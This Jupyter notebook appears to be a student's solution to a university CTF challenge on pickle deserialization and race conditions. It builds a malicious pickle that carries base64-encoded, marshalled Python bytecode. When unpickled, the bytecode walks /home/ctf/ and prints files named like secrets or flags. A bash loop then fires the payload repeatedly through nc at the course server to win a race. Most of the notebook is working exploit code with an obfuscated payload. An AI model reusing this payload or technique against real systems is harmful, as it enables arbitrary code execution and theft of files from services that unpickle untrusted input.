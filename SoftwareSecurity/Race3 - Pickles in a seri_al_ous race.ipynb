{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TERMINFO=/usr/share/terminfo\n",
      "env: PWNLIB_NOTERM=true\n"
     ]
    }
   ],
   "source": [
    "%env TERMINFO=/usr/share/terminfo\n",
    "%env PWNLIB_NOTERM=true"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle\n",
    "import marshal\n",
    "import base64\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ctypes\n",
      "FunctionType\n",
      "(cmarshal\n",
      "loads\n",
      "(cbase64\n",
      "b64decode\n",
      "(S'YwAAAAAHAAAABwAAAEMAAABzzgAAAGQBAGQAAGwAAH0AAHi7AHwAAGoBAGQCAIMBAERdqgBcAwB9AQB9AgB9AwBkAwB8AQB8AwBmAwBHSGcAAHwDAERdGwB9BAB8AABqAgBqAwB8AQB8BACDAgBeAgBxQAB9BQB4YgB8BQBEXVoAfQQAZAQAfAQAawYAc5IAZAUAfAQAawYAc5IAZAYAfAQAawYAcmgAfAQAR0h0BAB8BABkBwCDAgCPFwB9BgBkCABHSHwGAGoFAIMAAEdIV2QAAFFYcWgAcWgAV3EcAFdkAABTKAkAAABOaf////9zCgAAAC9ob21lL2N0Zi9zDQAAAEhFWSBIRVkgSEVZISF0BgAAAHNlY3JldHQEAAAAU1NvZnQEAAAAZmxhZ3QBAAAAcnMUAAAAQUFBQUFORCBUSEUgRkxBRyBJUzooBgAAAHQCAAAAb3N0BAAAAHdhbGt0BAAAAHBhdGh0BAAAAGpvaW50BAAAAG9wZW50BAAAAHJlYWQoBwAAAFIEAAAAdAQAAAByb290dAcAAABzdWJkaXJzdAUAAABmaWxlc3QBAAAAZnQKAAAAZnVsbF9wYXRoc3QHAAAAY29udGVudCgAAAAAKAAAAABzHwAAADxpcHl0aG9uLWlucHV0LTcwLTJkOWE1NGQ4ZWQyMj50AwAAAGZvbwEAAABzFAAAAAABDAEfAQ4BKAENASQDBQESAQUB'\n",
      "tRtRc__builtin__\n",
      "globals\n",
      "(tRS''\n",
      "tR(tR.\n"
     ]
    }
   ],
   "source": [
    "def foo():\n",
    "    import os\n",
    "    for root, subdirs, files in os.walk('/home/ctf/'):  # /Users/martinmirakyan/Desktop/Tecnico/\n",
    "        print('HEY HEY HEY!!', root, files)\n",
    "        full_paths = [os.path.join(root, f) for f in files]\n",
    "        for f in full_paths:\n",
    "            if 'secret' in f or 'SSof' in f or 'flag' in f:\n",
    "                print(f)\n",
    "                with open(f, 'r') as content:\n",
    "                    print('AAAAAND THE FLAG IS:')\n",
    "                    print(content.read())\n",
    "\n",
    "\n",
    "res = \"\"\"ctypes\n",
    "FunctionType\n",
    "(cmarshal\n",
    "loads\n",
    "(cbase64\n",
    "b64decode\n",
    "(S'%s'\n",
    "tRtRc__builtin__\n",
    "globals\n",
    "(tRS''\n",
    "tR(tR.\"\"\" % base64.b64encode(marshal.dumps(foo.__code__))\n",
    "\n",
    "with open('out.p', 'w') as f:\n",
    "    f.write(res)\n",
    "print(res)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('out.p', 'r') as f:\n",
    "    data = f.read()\n",
    "    pickle.loads(data)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create malicious pickle file\n",
    "1. nc mustard.stt.rnl.tecnico.ulisboa.pt 12203\n",
    "2. yoyoawesome\n",
    "3. 1 (free)\n",
    "4. 1 (Write)\n",
    "5. dump (Name)\n",
    "6. content\n",
    "\n",
    "\n",
    "### Load the malicious pickle file\n",
    "1. nc mustard.stt.rnl.tecnico.ulisboa.pt 12203\n",
    "2. yoyoawesome\n",
    "3. 0 (classy)\n",
    "4. 0 (read)\n",
    "5. dump (Name)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "%%bash\n",
    "rm out.txt\n",
    "touch out.txt\n",
    "\n",
    "for VARIABLE in {1..30}\n",
    "do\n",
    "(python -c 'print(\"yoyoawesome\")'; \n",
    "python -c 'print(1)'; \n",
    "python -c 'print(1)'; \n",
    "python -c 'print(\"dump\")'; \n",
    "python -c \"print('''ctypes\n",
    "FunctionType\n",
    "(cmarshal\n",
    "loads\n",
    "(cbase64\n",
    "b64decode\n",
    "(S'YwAAAAAHAAAABwAAAEMAAABzzgAAAGQBAGQAAGwAAH0AAHi7AHwAAGoBAGQCAIMBAERdqgBcAwB9AQB9AgB9AwBkAwB8AQB8AwBmAwBHSGcAAHwDAERdGwB9BAB8AABqAgBqAwB8AQB8BACDAgBeAgBxQAB9BQB4YgB8BQBEXVoAfQQAZAQAfAQAawYAc5IAZAUAfAQAawYAc5IAZAYAfAQAawYAcmgAfAQAR0h0BAB8BABkBwCDAgCPFwB9BgBkCABHSHwGAGoFAIMAAEdIV2QAAFFYcWgAcWgAV3EcAFdkAABTKAkAAABOaf////9zCgAAAC9ob21lL2N0Zi9zDQAAAEhFWSBIRVkgSEVZISF0BgAAAHNlY3JldHQEAAAAU1NvZnQEAAAAZmxhZ3QBAAAAcnMUAAAAQUFBQUFORCBUSEUgRkxBRyBJUzooBgAAAHQCAAAAb3N0BAAAAHdhbGt0BAAAAHBhdGh0BAAAAGpvaW50BAAAAG9wZW50BAAAAHJlYWQoBwAAAFIEAAAAdAQAAAByb290dAcAAABzdWJkaXJzdAUAAABmaWxlc3QBAAAAZnQKAAAAZnVsbF9wYXRoc3QHAAAAY29udGVudCgAAAAAKAAAAABzHwAAADxpcHl0aG9uLWlucHV0LTcwLTJkOWE1NGQ4ZWQyMj50AwAAAGZvbwEAAABzFAAAAAABDAEfAQ4BKAENASQDBQESAQUB'\n",
    "tRtRc__builtin__\n",
    "globals\n",
    "(tRS''\n",
    "tR(tR.\n",
    "\n",
    "''')\") | nc mustard.stt.rnl.tecnico.ulisboa.pt 12203 > /dev/null &\n",
    "\n",
    "\n",
    "(python -c 'print(\"yoyoawesome\")'; \n",
    "python -c 'print(0)'; \n",
    "python -c 'print(0)'; \n",
    "python -c 'print(\"dump\")') | nc mustard.stt.rnl.tecnico.ulisboa.pt >> out.txt 12203 &\n",
    "\n",
    "done"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2.7",
   "language": "python",
   "name": "py27"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.18"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
